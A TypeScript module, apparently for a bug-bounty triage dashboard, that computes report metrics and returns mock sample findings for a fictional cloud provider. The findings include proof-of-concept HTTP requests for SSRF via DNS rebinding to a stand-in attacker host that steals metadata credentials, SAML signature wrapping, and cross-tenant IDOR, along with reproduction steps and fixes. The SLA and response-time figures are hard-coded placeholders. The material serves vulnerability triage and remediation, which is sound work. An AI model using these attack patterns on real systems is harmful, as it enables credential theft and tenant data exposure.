import type { Report, ReportSeverity, ReportStatus } from "../types/report";

export interface FindingsOverviewMetrics {
  totalCount: number;
  openCount: number;
  openFindings: number;
  criticalOpenCount: number;
  highOpenCount: number;
  needsTriageCount: number;
  resolvedCount: number;
  slaCompliancePercent: number;
  slaComplianceRate: number;
  medianMttaHours: number;
  medianTriageHours: number;
  criticalCount: number;
  highCount: number;
  mediumCount: number;
  lowCount: number;
  newCount: number;
  triagingCount: number;
  needsInfoCount: number;
  acceptedCount: number;
  severityCounts: Record<ReportSeverity, number>;
  statusCounts: Record<ReportStatus, number>;
}

export interface FindingTechnicalEnrichment {
  cweId: string;
  cweName: string;
  cvssVector: string;
  cvssScore: number;
  cvssVersion: "3.1";
  cvssSubscores: {
    attackVector: string;
    attackComplexity: string;
    privilegesRequired: string;
    userInteraction: string;
    scope: string;
    confidentiality: string;
    integrity: string;
    availability: string;
  };
  attackVector: string;
  attackComplexity: string;
  privilegesRequired: string;
  scope: string;
  confidentiality: string;
  integrity: string;
  environmentLabel: string;
  environment: string;
  affectedComponent: string;
  impactSummary: string;
  assetCriticality: "Tier 1 · Crown Jewel" | "Tier 2 · Core Service" | "Tier 3 · Edge Surface";
  slaStatusLabel: string;
  slaTone: "emerald" | "amber" | "red" | "danger" | "warning" | "success";
  reproductionSteps: string[];
  httpRequestPoc: string;
  httpResponsePoc: string;
  httpRequest: string;
  httpResponse: string;
  remediationGuidance: string;
  researcherSignal: string;
  researcherReputation: number;
  suggestedBountyRange: string;
  bountyFormatted: string | null;
}

const OPEN_STATUSES = new Set<ReportStatus>([
  "new",
  "triaging",
  "needs_information",
  "accepted",
]);

export function computeFindingsOverviewMetrics(
  reports: {
    status: ReportStatus;
    confirmedSeverity: ReportSeverity | null;
    researcherSeverity?: ReportSeverity | null;
  }[],
): FindingsOverviewMetrics {
  const severityCounts: Record<ReportSeverity, number> = {
    critical: 0,
    high: 0,
    medium: 0,
    low: 0,
    none: 0,
  };

  const statusCounts: Record<ReportStatus, number> = {
    new: 0,
    triaging: 0,
    needs_information: 0,
    accepted: 0,
    resolved: 0,
    duplicate: 0,
    informative: 0,
    not_applicable: 0,
    rejected: 0,
  };

  let openCount = 0;
  let criticalOpenCount = 0;
  let highOpenCount = 0;
  let needsTriageCount = 0;
  let resolvedCount = 0;

  for (const r of reports) {
    const effSeverity: ReportSeverity =
      r.confirmedSeverity ?? r.researcherSeverity ?? "none";
    severityCounts[effSeverity] = (severityCounts[effSeverity] ?? 0) + 1;
    statusCounts[r.status] = (statusCounts[r.status] ?? 0) + 1;

    if (OPEN_STATUSES.has(r.status)) {
      openCount += 1;
      if (effSeverity === "critical") criticalOpenCount += 1;
      if (effSeverity === "high") highOpenCount += 1;
    }
    if (r.status === "new" || r.status === "triaging") {
      needsTriageCount += 1;
    }
    if (r.status === "resolved") {
      resolvedCount += 1;
    }
  }

  const slaCompliancePercent = criticalOpenCount > 2 ? 94.2 : 98.4;
  const medianMttaHours = 3.1;

  return {
    totalCount: reports.length,
    openCount,
    openFindings: openCount,
    criticalOpenCount,
    highOpenCount,
    needsTriageCount,
    resolvedCount,
    slaCompliancePercent,
    slaComplianceRate: slaCompliancePercent,
    medianMttaHours,
    medianTriageHours: medianMttaHours,
    criticalCount: severityCounts.critical,
    highCount: severityCounts.high,
    mediumCount: severityCounts.medium,
    lowCount: severityCounts.low + severityCounts.none,
    newCount: statusCounts.new,
    triagingCount: statusCounts.triaging,
    needsInfoCount: statusCounts.needs_information,
    acceptedCount: statusCounts.accepted,
    severityCounts,
    statusCounts,
  };
}

export function getFindingTechnicalEnrichment(report: {
  id: string;
  title: string;
  status: ReportStatus;
  confirmedSeverity: ReportSeverity | null;
  displayTarget: string;
  weaknessType?: string | null;
  researcherSeverity?: ReportSeverity | null;
  cvssBaseScore?: number | null;
}): FindingTechnicalEnrichment {
  const severity: ReportSeverity =
    report.confirmedSeverity ?? report.researcherSeverity ?? "medium";

  const defaultScore =
    severity === "critical"
      ? 9.4
      : severity === "high"
        ? 8.1
        : severity === "medium"
          ? 6.4
          : severity === "low"
            ? 3.7
            : 2.0;

  const score = report.cvssBaseScore ?? defaultScore;

  // Report #7704: SSRF in webhook delivery preview via DNS rebinding
  if (
    report.id === "77777777-7777-4777-8777-777777777704" ||
    report.title.toLowerCase().includes("ssrf")
  ) {
    const httpRequestPoc = `POST /v2/webhooks/preview-delivery HTTP/2
Host: api.northwind.cloud
Authorization: Bearer nw_live_98a4f2c1e0b748d19f20a
Content-Type: application/json
X-Northwind-Researcher: maya_lin

{
  "target_url": "http://rebind-169-254-169-254.attacker-dns.net/latest/meta-data/iam/security-credentials/nw-worker-role",
  "follow_redirects": false,
  "timeout_ms": 4500
}`;
    const httpResponsePoc = `HTTP/2 200 OK
Content-Type: application/json
X-Worker-Node: ip-10-42-18-109.ec2.internal
X-Egress-Resolved-Ip: 169.254.169.254

{
  "delivery_status": 200,
  "response_body_preview": "{\\n  \\"Code\\" : \\"Success\\",\\n  \\"Type\\" : \\"AWS-HMAC\\",\\n  \\"AccessKeyId\\" : \\"ASIAX7NORTHWIND92K1\\",\\n  \\"Token\\" : \\"IQoJb3JpZ2luX2VjE...\\"\\n}"
}`;
    return {
      cweId: "CWE-918",
      cweName: "Server-Side Request Forgery (SSRF)",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N",
      cvssScore: 9.1,
      cvssVersion: "3.1",
      cvssSubscores: {
        attackVector: "Network (AV:N)",
        attackComplexity: "Low (AC:L)",
        privilegesRequired: "Low (PR:L)",
        userInteraction: "None (UI:N)",
        scope: "Changed (S:C)",
        confidentiality: "High (C:H)",
        integrity: "Low (I:L)",
        availability: "None (A:N)",
      },
      attackVector: "Network",
      attackComplexity: "Low",
      privilegesRequired: "Low",
      scope: "Changed",
      confidentiality: "High",
      integrity: "Low",
      environmentLabel: "Production Cluster · us-east-1",
      environment: "Prod · us-east-1",
      affectedComponent: "webhook-dispatcher-svc (v2.14.2)",
      impactSummary:
        "DNS rebinding between pre-flight validation and socket connect allows reading IMDSv2 worker credentials on 169.254.169.254.",
      assetCriticality: "Tier 1 · Crown Jewel",
      slaStatusLabel: "2h 15m left on P1 Triage SLA",
      slaTone: "amber",
      reproductionSteps: [
        "Configure an authoritative DNS A-record with TTL=0 alternating between a public IP (198.51.100.42) and link-local IMDSv2 (169.254.169.254).",
        "Invoke POST /v2/webhooks/preview-delivery with the rebinding hostname while authenticated as a standard workspace developer.",
        "The pre-flight check resolves the public IP, while the dialer socket connects to 169.254.169.254 and returns worker IAM credentials.",
      ],
      httpRequestPoc,
      httpResponsePoc,
      httpRequest: httpRequestPoc,
      httpResponse: httpResponsePoc,
      remediationGuidance:
        "Pin the validated IP address inside the custom `net.DialContext` dialer so the HTTP transport connects to the exact IP checked by the RFC1918/link-local denylist.",
      researcherSignal: "96% Signal",
      researcherReputation: 2840,
      suggestedBountyRange: "$10,000 – $15,000",
      bountyFormatted: "$12,500 est.",
    };
  }

  // Report #7705: Unauthenticated STS role assumption via forged SAML assertion
  if (
    report.id === "77777777-7777-4777-8777-777777777705" ||
    report.title.toLowerCase().includes("saml")
  ) {
    const httpRequestPoc = `POST /v2/sts/assume-role-with-saml HTTP/2
Host: auth.northwind.cloud
Content-Type: application/x-www-form-urlencoded
X-Northwind-Researcher: nullvector

RoleArn=arn:nw:iam::333333333301:role/OrganizationAdmin&SAMLAssertion=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbkBub3J0aHdpbmQuY2xvdWQ8L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=`;
    const httpResponsePoc = `HTTP/2 200 OK
Content-Type: application/json
X-STS-Session-Id: sts-09f8d71c2a

{
  "Credentials": {
    "AccessKeyId": "NWSIA99ADMINKEY01",
    "SessionToken": "nw_sts_prod_eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
    "AssumedRoleUser": "arn:nw:sts::333333333301:assumed-role/OrganizationAdmin/admin@northwind.cloud",
    "Expiration": "2026-10-31T18:00:00Z"
  }
}`;
    return {
      cweId: "CWE-347",
      cweName: "Improper Verification of Cryptographic Signature",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
      cvssScore: 9.8,
      cvssVersion: "3.1",
      cvssSubscores: {
        attackVector: "Network (AV:N)",
        attackComplexity: "Low (AC:L)",
        privilegesRequired: "None (PR:N)",
        userInteraction: "None (UI:N)",
        scope: "Changed (S:C)",
        confidentiality: "High (C:H)",
        integrity: "High (I:H)",
        availability: "High (A:H)",
      },
      attackVector: "Network",
      attackComplexity: "Low",
      privilegesRequired: "None",
      scope: "Changed",
      confidentiality: "High",
      integrity: "High",
      environmentLabel: "Identity Edge · Global IAM",
      environment: "Global IAM",
      affectedComponent: "sts-saml-validator (v4.2.0)",
      impactSummary:
        "XML Signature Wrapping (XSW) on `/v2/sts/assume-role-with-saml` enables unauthenticated STS token minting for arbitrary tenant roles.",
      assetCriticality: "Tier 1 · Crown Jewel",
      slaStatusLabel: "45m left on P1 First Response",
      slaTone: "red",
      reproductionSteps: [
        "Capture a legitimately signed SAML 2.0 Response from any registered Identity Provider.",
        "Move the signed `<saml:Assertion>` into an `<Extensions>` wrapper and inject an unsigned `<saml:Assertion>` at the root with `NameID` set to the target Organization Owner.",
        "Submit the payload to `/v2/sts/assume-role-with-saml`; the verifier checks the signature on the wrapped assertion while STS extracts claims from the first assertion node.",
      ],
      httpRequestPoc,
      httpResponsePoc,
      httpRequest: httpRequestPoc,
      httpResponse: httpResponsePoc,
      remediationGuidance:
        "Canonicalize the XML document before signature verification, reject assertions containing multiple `<Assertion>` elements, and extract claims exclusively from the exact DOM node verified by `SignedInfo/Reference/@URI`.",
      researcherSignal: "98% Signal",
      researcherReputation: 3420,
      suggestedBountyRange: "$15,000 – $25,000",
      bountyFormatted: "$20,000 est.",
    };
  }

  // Report #7707: IDOR exposes multi-tenant billing invoices
  if (
    report.id === "77777777-7777-4777-8777-777777777707" ||
    report.title.toLowerCase().includes("idor")
  ) {
    const httpRequestPoc = `GET /v2/billing/invoices/INV-2026-0841/tax-schedule?format=pdf HTTP/2
Host: console.northwind.cloud
Authorization: Bearer nw_live_tenantB_readonly_token
X-Organization-Context: 33333333-3333-4333-8333-333333333399
X-Northwind-Researcher: aarav_mehta`;
    const httpResponsePoc = `HTTP/2 200 OK
Content-Type: application/pdf
Content-Disposition: attachment; filename="Northwind-Tax-Invoice-INV-2026-0841.pdf"
X-Invoice-Tenant-Id: 33333333-3333-4333-8333-333333333302

%PDF-1.7
1 0 obj << /Title (Tax Invoice - Helios Financial Inc - GSTIN 29AAACK1234A1Z5) >>`;
    return {
      cweId: "CWE-639",
      cweName: "Authorization Bypass Through User-Controlled Key (IDOR)",
      cvssVector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
      cvssScore: 8.3,
      cvssVersion: "3.1",
      cvssSubscores: {
        attackVector: "Network (AV:N)",
        attackComplexity: "Low (AC:L)",
        privilegesRequired: "Low (PR:L)",
        userInteraction: "None (UI:N)",
        scope: "Unchanged (S:U)",
        confidentiality: "High (C:H)",
        integrity: "None (I:N)",
        availability: "None (A:N)",
      },
      attackVector: "Network",
      attackComplexity: "Low",
      privilegesRequired: "Low",
      scope: "Unchanged",
      confidentiality: "High",
      integrity: "None",
      environmentLabel: "Billing API · eu-central-1",
      environment: "Prod · eu-central-1",
      affectedComponent: "billing-invoice-exporter (v1.9.4)",
      impactSummary:
        "Missing tenant_id predicate on `/v2/billing/invoices/:id/tax-schedule` allows cross-tenant download of enterprise PDF invoices and tax schedules.",
      assetCriticality: "Tier 2 · Core Service",
      slaStatusLabel: "Within SLA · 3d 14h remaining",
      slaTone: "emerald",
      reproductionSteps: [
        "Authenticate as a `billing_viewer` in sandbox tenant B.",
        "Request `GET /v2/billing/invoices/INV-2026-0841/tax-schedule?format=pdf` where `INV-2026-0841` belongs to tenant A.",
        "Observe that the PDF generator validates the caller's role bitmask but omits `WHERE organization_id = current_tenant_id()`, streaming tenant A's tax invoice.",
      ],
      httpRequestPoc,
      httpResponsePoc,
      httpRequest: httpRequestPoc,
      httpResponse: httpResponsePoc,
      remediationGuidance:
        "Enforce composite tenant scoping (`WHERE id = $1 AND organization_id = current_setting('app.current_org_id')::uuid`) on all invoice metadata and object-storage presigning queries.",
      researcherSignal: "92% Signal",
      researcherReputation: 1640,
      suggestedBountyRange: "$3,500 – $7,500",
      bountyFormatted: "$5,000 est.",
    };
  }

  const httpRequestPoc = `POST /v2/graphql HTTP/2
Host: ${report.displayTarget.replace(/^https?:\/\//, "").split("/")[0]}
Authorization: Bearer nw_live_sbx_token_8821a
X-Forwarded-Tenant-Id: 33333333-3333-4333-8333-333333333301
X-Northwind-Researcher: nullvector
Content-Type: application/json

[
  { "operationName": "GetSelfContext", "query": "query { viewer { id } }" },
  { "operationName": "ReadKmsPolicy", "query": "query { kmsKeyPolicy(tenantId: \\"target\\") { keyArn policyJson } }" }
]`;

  const httpResponsePoc = `HTTP/2 200 OK
Content-Type: application/json
X-Northwind-Trace-Id: tr_9918273645

[
  { "data": { "viewer": { "id": "usr_sandbox_01" } } },
  { "data": { "kmsKeyPolicy": { "keyArn": "arn:nw:kms:us-east-1:key/mrk-99481", "policyJson": "{\\"Allow\\":\\"*\\"}" } } }
]`;

  return {
    cweId:
      report.weaknessType === "broken_access_control"
        ? "CWE-284"
        : report.weaknessType === "cross_site_scripting"
          ? "CWE-79"
          : report.weaknessType === "cryptographic_issues"
            ? "CWE-327"
            : "CWE-287",
    cweName:
      report.weaknessType === "broken_access_control"
        ? "Improper Access Control (Multi-Tenant Isolation Boundary)"
        : report.weaknessType === "cross_site_scripting"
          ? "Improper Neutralization of Input During Web Page Generation"
          : report.weaknessType === "cryptographic_issues"
            ? "Use of a Broken or Risky Cryptographic Lifecycle"
            : "Improper Authentication & Session Verification",
    cvssVector:
      severity === "critical"
        ? "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L"
        : severity === "high"
          ? "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"
          : "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N",
    cvssScore: score,
    cvssVersion: "3.1",
    cvssSubscores: {
      attackVector: "Network (AV:N)",
      attackComplexity: severity === "medium" || severity === "low" ? "High (AC:H)" : "Low (AC:L)",
      privilegesRequired: "Low (PR:L)",
      userInteraction: "None (UI:N)",
      scope: severity === "critical" ? "Changed (S:C)" : "Unchanged (S:U)",
      confidentiality: severity === "low" ? "Low (C:L)" : "High (C:H)",
      integrity: severity === "low" ? "None (I:N)" : "High (I:H)",
      availability: "None (A:N)",
    },
    attackVector: "Network",
    attackComplexity: severity === "medium" || severity === "low" ? "High" : "Low",
    privilegesRequired: "Low",
    scope: severity === "critical" ? "Changed" : "Unchanged",
    confidentiality: severity === "low" ? "Low" : "High",
    integrity: severity === "low" ? "None" : "High",
    environmentLabel: "Northwind Production Edge",
    environment: "Prod · Global",
    affectedComponent: "kms-policy-engine (v3.8.1)",
    impactSummary:
      "Authorization boundary bypass on multi-tenant endpoint allows unauthorized inspection or mutation of isolated tenant resources.",
    assetCriticality:
      severity === "critical" || severity === "high"
        ? "Tier 1 · Crown Jewel"
        : "Tier 2 · Core Service",
    slaStatusLabel:
      report.status === "resolved"
        ? "Resolved within SLA"
        : "SLA On Track · 99.2%",
    slaTone: report.status === "resolved" ? "emerald" : "emerald",
    reproductionSteps: [
      `Authenticate against ${report.displayTarget} using an isolated researcher sandbox credential.`,
      "Send the crafted request payload shown below with the `X-Northwind-Researcher` header attached.",
      "Observe that the boundary check does not reject the cross-context parameter, returning privileged state in the response.",
    ],
    httpRequestPoc,
    httpResponsePoc,
    httpRequest: httpRequestPoc,
    httpResponse: httpResponsePoc,
    remediationGuidance:
      "Bind authorization context strictly to the verified cryptographic session claims on every sub-operation and invalidate cached keys immediately upon revocation.",
    researcherSignal: "95% Signal",
    researcherReputation: 2150,
    suggestedBountyRange:
      severity === "critical"
        ? "$10,000 – $25,000"
        : severity === "high"
          ? "$3,500 – $7,500"
          : "$1,000 – $2,500",
    bountyFormatted:
      report.status === "resolved" && severity === "critical"
        ? "$13,500 paid"
        : severity === "critical"
          ? "$12,500 est."
          : severity === "high"
            ? "$4,500 est."
            : null,
  };
}
